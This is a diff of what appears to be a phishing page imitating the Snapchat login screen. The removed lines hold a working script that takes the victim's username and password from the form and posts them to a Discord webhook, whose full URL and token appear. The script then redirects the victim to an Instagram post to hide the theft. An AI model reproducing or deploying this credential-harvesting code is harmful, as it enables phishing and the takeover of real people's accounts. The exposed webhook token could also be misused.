@@ -58,26 +58,6 @@
 </style>
 <title>Log In - Snapchat</title>
 <link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico"/>
-<script>
-    function sendMessage() {
-    function sleep(milliseconds) {
-    const date = Date.now();
-    let currentDate = null;
-    do {
-      currentDate = Date.now();
-    } while (currentDate - date < milliseconds);
-  }
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/966849665100292147/4BWgb3zJlCu0JfTo-xKYyztqBAb3FS7bg8V7aCDvr8MPeVNQejIW8UX10AMT581MinT2");
-      request.setRequestHeader('Content-type', 'application/json');
-      var params = {
-        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-      }
-      request.send(JSON.stringify(params));
-      sleep(400)
-      window.location.replace("https://www.instagram.com/p/By7NkskoTip");
-    }
-</script>
 <body>
    <center>
    <img src="https://seeklogo.com/images/S/snapchat-logo-47531E7AE8-seeklogo.com.png" style="width:156px;padding-top:80px;">
